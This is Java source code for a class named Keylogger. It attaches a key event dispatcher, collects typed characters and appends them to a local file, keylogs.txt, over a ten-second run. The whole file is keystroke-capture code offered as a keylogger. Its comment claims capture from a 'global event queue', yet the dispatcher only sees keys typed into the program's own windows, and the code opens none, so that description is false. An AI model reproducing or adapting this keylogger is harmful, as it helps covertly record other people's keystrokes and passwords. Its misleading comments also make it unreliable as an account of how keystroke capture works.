import java.io.*;
import java.awt.event.*;
import java.awt.*;

public class Keylogger {

    private static String log = "";

    public static void main(String[] args) {
        // Add a key listener to the global event queue
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
            @Override
            public boolean dispatchKeyEvent(KeyEvent e) {
                // Check if the key event is of type KEY_TYPED
                if (e.getID() == KeyEvent.KEY_TYPED) {
                    // Append the key character to the log
                    log += e.getKeyChar();
                }
                return false;
            }
        });

        // Create a file writer
        FileWriter fw = null;
        try {
            fw = new FileWriter("keylogs.txt", true);
        } catch (IOException ex) {
            System.err.println("Error creating file writer.");
            ex.printStackTrace();
        }

        // Run the keylogger for 10 seconds
        long start = System.currentTimeMillis();
        while (System.currentTimeMillis() - start < 10000) {
            // Write the log to the file every 100ms
            try {
                Thread.sleep(100);
                fw.write(log);
                log = "";
            } catch (InterruptedException ex) {
                System.err.println("Error sleeping.");
                ex.printStackTrace();
            } catch (IOException ex) {
                System.err.println("Error writing to file.");
                ex.printStackTrace();
            }
        }

        // Close the file writer
        try {
            fw.close();
        } catch (IOException ex) {
            System.err.println("Error closing file writer.");
            ex.printStackTrace();
        }
    }
}
